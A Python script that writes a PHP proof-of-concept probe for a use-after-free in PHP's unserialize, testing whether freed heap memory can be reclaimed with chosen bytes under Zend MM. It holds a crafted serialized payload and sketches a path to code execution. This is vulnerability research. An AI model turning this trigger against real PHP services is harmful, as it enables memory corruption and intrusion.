# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""Feasibility probe for the var_destroy re-entry UAF: is the primitive usable with Zend MM on?

The published claim stops at a controlled pointer under ASAN, where Zend's allocator is bypassed. The
question that decides whether an exploit is even possible on a stock build is different: with Zend MM
active, can the freed 8160-byte entries block be reclaimed by something whose contents we choose, so that a
later `R:` reference reads our bytes as a zval pointer?

If yes, the rest of a chain is ordinary work (fake zval in a controlled buffer, destructor slot aimed at a
system-like function). If no, the bug stays a crash and the "RCE" claim in the README has no basis.

This script only measures. It prints, for each candidate reclaim length, whether the process survived or
died, and never aims at anything but an obviously invalid pointer (0x4242424242424242), so a crash is
unambiguous evidence of control and not a side effect.

usage:
  php -d memory_limit=128M uaf_reclaim_probe.php <len>      # one length
  bash: for L in ...; do php uaf_reclaim_probe.php $L; done  # sweep
"""
import sys


PHP = r'''<?php
// The destructor runs inside var_destroy's dtor walk, with the outer unserialize() context already freed.
// Allocating here is the reclaim attempt; unserialize('R:...') then reads a zval pointer out of whatever
// now occupies the freed block.
class Reclaim {
    public function __destruct() {
        $GLOBALS['buffer'] = str_repeat('B', $GLOBALS['len']);   // reclaim attempt, contents known
        $r = @unserialize($GLOBALS['ref']);                      // read a zval* out of the reclaimed bytes
        echo "inner returned\n";
    }
}

$GLOBALS['len'] = (int)($argv[1] ?? 8159);
$GLOBALS['ref'] = $argv[2] ?? 'R:1021;';
$GLOBALS['buffer'] = null;

$parts = [];
for ($k = 0; $k <= 1017; $k++) {
    $parts[] = "i:$k;i:1;";
}
$parts[] = 'i:9998;O:7:"Reclaim":0:{}';
$parts[] = 'i:9998;i:5;';          // duplicate key: moves the object into a destructor slot
$payload = 'a:1020:{' . implode('', $parts) . '}';

echo "len=", $GLOBALS['len'], " payload=", strlen($payload), "\n";
$result = unserialize($payload);
echo "SURVIVED len=", $GLOBALS['len'], " outer=", var_export($result !== false, true), "\n";
'''


def main() -> int:
    out = "uaf_reclaim_probe.php"
    with open(out, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(PHP)
    print("wrote", out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
